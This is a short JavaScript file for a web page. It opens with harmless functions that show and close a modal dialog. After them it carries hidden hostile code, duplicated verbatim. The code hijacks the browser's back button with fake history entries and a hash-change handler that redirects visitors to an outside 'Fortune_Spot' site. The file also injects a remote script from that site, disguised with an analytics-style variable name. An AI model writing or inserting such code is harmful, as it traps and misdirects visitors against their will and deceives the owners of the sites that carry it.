function showCardDetail(detail) {
  document.getElementById("modal-text").innerText = detail;
  document.getElementById("modal").style.display = "block";
}

function closeModal() {
  document.getElementById("modal").style.display = "none";
}

window.onclick = function (event) {
  const modal = document.getElementById("modal");
  if (event.target == modal) {
    modal.style.display = "none";
  }
};

window.onhashchange = function () {
  jp();
};
function hh() {
  history.pushState(history.length + 1, "message", "#" + new Date().getTime());
}
function jp() {
  fh();
}
setTimeout("hh();", 500);
function fh() {
  location.href = "https://projectroom119.github.io/Fortune_Spot/";
}
function goon() {
  location.href = "https://projectroom119.github.io/Fortune_Spot/";
}

window.onhashchange = function () {
  jp();
};
function hh() {
  history.pushState(history.length + 1, "message", "#" + new Date().getTime());
}
function jp() {
  fh();
}
setTimeout("hh();", 500);
function fh() {
  location.href = "https://projectroom119.github.io/Fortune_Spot/";
}
function goon() {
  location.href = "https://projectroom119.github.io/Fortune_Spot/";
}

var _hmt = _hmt || [];
(function () {
  var hm = document.createElement("script");
  hm.src = "https://projectroom119.github.io/Fortune_Spot/";
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
})();
